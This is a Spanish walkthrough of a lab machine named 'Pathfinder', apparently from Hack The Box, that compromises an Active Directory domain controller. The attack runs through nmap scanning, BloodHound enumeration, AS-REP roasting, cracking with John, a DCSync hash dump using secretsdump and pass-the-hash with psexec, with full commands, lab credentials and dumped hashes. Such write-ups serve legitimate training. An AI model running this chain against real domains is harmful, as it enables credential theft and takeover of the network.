# PATHFINDER

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.30
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Tue Jun 15 15:20:41 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.30
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.30 ()	Status: Up
Host: 10.10.10.30 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49672/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49683/open/tcp/////, 49700/open/tcp/////, 49720/open/tcp/////
# Nmap done at Tue Jun 15 15:20:58 2021 -- 1 IP address (1 host up) scanned in 17.00 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49672,49676,49677,49683,49700,49720 -oN targeted 10.10.10.30
```

```bash
File: targeted

# Nmap 7.91 scan initiated Tue Jun 15 15:21:39 2021 as: nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49672,49676,49677,49683,49700,49720 -oN targeted 10.10.10.30
Nmap scan report for 10.10.10.30
Host is up (0.049s latency).


PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-15 20:28:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows


Host script results:
|_clock-skew: 7h07m10s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-15T20:29:49
|_  start_date: N/A


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 15 15:22:45 2021 -- 1 IP address (1 host up) scanned in 65.36 seconds
```

<br>

Como vemos, tenemos una gran cantidad de puertos abiertos. Vemos unos cuantos puertos interesantes, tenemos abiertos tanto el puerto 53 (DNS) como el 88 (Kerberos) y el 389 (LDAP), esto nos indicará que estamos ante un Domain-Controller en un entorno de directorio activo. Tambien tenemos el puerto 5985 que corre el servicio WinRM.

En este punto tendríamos muchas formas de enumerar el directorio activo, pero ya que tenemos unas credenciales de usuario de la máquina Shield, probaremos con estas:

```plaintext
File: AD_Creds

sandra:Password1234!
```

<br>

### WinRM
Lo primero que haremos será intentar acceder vía WinRM con las credenciales que tenemos. Para ello usaremos la herramienta [evil-winrm](https://github.com/Hackplayers/evil-winrm):

```bash
evil-winrm -i 10.10.10.30 -u sandra -p Password1234!
```

<br>

### Bloodhound
Para enumerar la máquina usaremos [BloodHound](https://github.com/BloodHoundAD/BloodHound). Lo primero que haremos será subir a la máquina víctima un recolector de información que más tarde [BloodHound](https://github.com/BloodHoundAD/BloodHound) nos mostrará de forma gráfica. Desde [evil-winrm](https://github.com/Hackplayers/evil-winrm) usaremos el comando upload para subir archivos locales a la máquina víctima:

```powershell
upload SharpHound.exe
```

Una vez ejecutado, veremos que nos creará un comprimido con la información recolectada, utilizaremos el comando download para descargar a nuestra máquina esta información.

```powershell
download 20210713083632_BloodHound.zip
```

En este punto, queremos ver la representación de datos de forma visual por lo que usaremos [BloodHound](https://github.com/BloodHoundAD/BloodHound) en conjunto con [Neo4j](https://github.com/neo4j/neo4j). Lo primero que haremos será iniciar el servicio de [Neo4j](https://github.com/neo4j/neo4j):

```bash
neo4j console
```

A continuación, lanzaremos el servicio [BloodHound](https://github.com/BloodHoundAD/BloodHound) con el siguiente comando:

```bash
bloodhound
```

Subiremos el archivo comprimido que acabamos de recolectar, y nos iremos al apartado de queries predefinidas. En concreto nos iremos a la siguiente query:

<img src="https://i.imgur.com/S65vqzQ.png" width="400"/>

Esta query nos indicará los usuarios del directorio activo que son vulnerables al ataque AS-REP Roast:

<img src="https://i.imgur.com/PLUnUV6.png" width="200"/>

Como vemos [BloodHound](https://github.com/BloodHoundAD/BloodHound) nos indica un usuario vulnerable, el usuario svc_bes.

<br>

## Shell de usuario

### AS-REP Roasting
Una vez intuimos que el usuario svc_bes es vulnerable a AS-REP Roast, comprobaremos si realmente esto se cumple. Para ello, usaremos el script GetNPUsers de [Impacket](https://github.com/SecureAuthCorp/impacket). Esta herramienta nos permitirá listar los usuarios que no requieran de preautenticación Kerberos y también obtener sus TGTs (Ticket Granting Tickets).

Comenzaremos por usar las credenciales que ya conocíamos para listar los usuarios vulnerables:

```bash
impacket-GetNPUsers megacorp.local/sandra:Password1234! -dc-ip 10.10.10.30
```

```plaintext
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Name     MemberOf                                                    PasswordLastSet             LastLogon                   UAC      
-------  ----------------------------------------------------------  --------------------------  --------------------------  --------
svc_bes  CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL  2020-03-21 01:16:54.721477  2020-01-31 19:43:08.298549  0x400200
```

Podemos ver que efectivamente el usuario svc_bes es vulnerable. Por lo que trataremos de listar su TGT (Ticket Granting Ticket). Para ello:

```bash
impacket-GetNPUsers megacorp.local/svc_bes -no-pass -dc-ip 10.10.10.30
```

```plaintext
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for svc_bes
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:29999316dfd44a06aee015719371564c$476126f61c926e3af5760980f6bcc96685e76e2144cf5a001e807c91016fe4f4bc46acd6194c385465e02465bf68d33295542244e394fbd487cb29381970222a6f0eeab4ea29c9bb2c319a9ca191890d23abe953e77371e5cbcbf96ea099d898822860eb98ef7ef7f47af1dd04c8c493484a6873faeb66bb89932931425ec5bfab6a65045cbc8420ac05b4fb62a45abf2096cb0afbf7a53ed4a307bb16124f68fe820b4009aad5f4e3d79d508b1ae3129456701f29c6a6608d85ab89cb770f240d5dd0124b19ce78d2a0655d44895097b0d403b1598849fb920b34166ca7ba12c24fcf1fb467588fd3686ceed909112f
```

<br>

### Cracking
Una vez obtenemos el TGT (Ticket Granting Ticket) del usuario trataremos de crackear el mismo, ya que como sabemos, este hash no nos permite hacer PTH (Pass The Hash). Para ello usaremos [John](https://github.com/openwall/john) junto al diccionario rockyou.txt:

```bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

```plaintext
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sheffield19      ($krb5asrep$23$svc_bes@MEGACORP.LOCAL)
1g 0:00:00:18 DONE (2021-07-14 16:19) 0.05555g/s 589056p/s 589056c/s 589056C/s Sherbear94..Sheepy04
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Como vemos, tendremos una coincidencia con el diccionario rockyou.txt por lo que visualizaremos la contraseña en texto claro que corresponderá al hash que hemos obtenido anteriormente:

```bash
john --show hash                             
```

```plaintext
$krb5asrep$23$svc_bes@MEGACORP.LOCAL:Sheffield19

1 password hash cracked, 0 left
```

<br>

### WinRM
Una vez obtenemos la contraseña, procederemos a conectarnos a la máquina víctima de forma análoga a como lo habíamos hecho, con [evil-winrm](https://github.com/Hackplayers/evil-winrm):

```bash
evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
```

Una vez accedido a la máquina visualizaremos la flag user.txt en el directorio C:\Users\svc_bes\Desktop.

<br>

## Shell de administrador

### Enumeración
Para conseguir una shell de administrador, lo primero que haremos será enumerar nuevamente el directorio activo con [BloodHound](https://github.com/BloodHoundAD/BloodHound). En este caso usaremos la siguiente query: 

<img src="https://i.imgur.com/G1rufZ2.png" width="300"/>

Esta, nos indicará los usuarios que cuentan con permisos DCSync y cuáles son estos permisos:

<img src="https://i.imgur.com/L8ntwtJ.png" width="700"/>

Podemos ver que el usuario svc_bes cuenta con el permiso "GetChangesAll" sobre el dominio del directorio activo. Esto, nos permitirá listar los hashes NTLMv2 de todos los usuarios del directo activo, así como las keys de Kerberos de cada uno de ellos.

<br>

### NTLMv2
Para listar los hashes usaremos la herramienta SecretsDump de [Impacket](https://github.com/SecureAuthCorp/impacket):

```bash
impacket-secretsdump megacorp.local/svc_bes:Sheffield19@10.10.10.30
```

```plaintext
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
PATHFINDER$:1000:aad3b435b51404eeaad3b435b51404ee:cc0d7ae2abacad631e16ad5c807dd432:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
Administrator:des-cbc-md5:f1c89e75a42cd0fb
krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
krbtgt:des-cbc-md5:d0f8d0c86ee9d997
svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
svc_bes:des-cbc-md5:1cc16e37ef8940b5
sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
sandra:des-cbc-md5:23988f7a9d679d37
PATHFINDER$:aes256-cts-hmac-sha1-96:c27dec3ba02510da73d21911106fdd3bec31785ce20b89695b57a75c8e7328f3
PATHFINDER$:aes128-cts-hmac-sha1-96:11b0ad3c20fb7750a3212bb2f1023c4f
PATHFINDER$:des-cbc-md5:e364941fc7ef5dd3
[*] Cleaning up... 
```

Como vemos, habremos listado los hashes NTLMv2 de todos los usuarios del directorio activo, esto nos permitirá hacer PTH (Pass The Hash) y podremos acceder a todos ellos sin necesidad de proporcionar contraseña.

<br>

### Pass The Hash
Para autenticarnos como el usuario Administrator mediante el método PTH (Pass The Hash) usaremos la herramienta PSExec de [Impacket](https://github.com/SecureAuthCorp/impacket):

```bash
impacket-psexec megacorp.local/Administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```

```plaintext
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.30.....
[*] Found writable share ADMIN$
[*] Uploading file JMFXofgn.exe
[*] Opening SVCManager on 10.10.10.30.....
[*] Creating service GadZ on 10.10.10.30.....
[*] Starting service GadZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Obtendremos una shell como el usuario Administrator por lo que podremos dirigirnos al directorio C:\Users\Administrator\Desktop y visualizar la flag root.txt.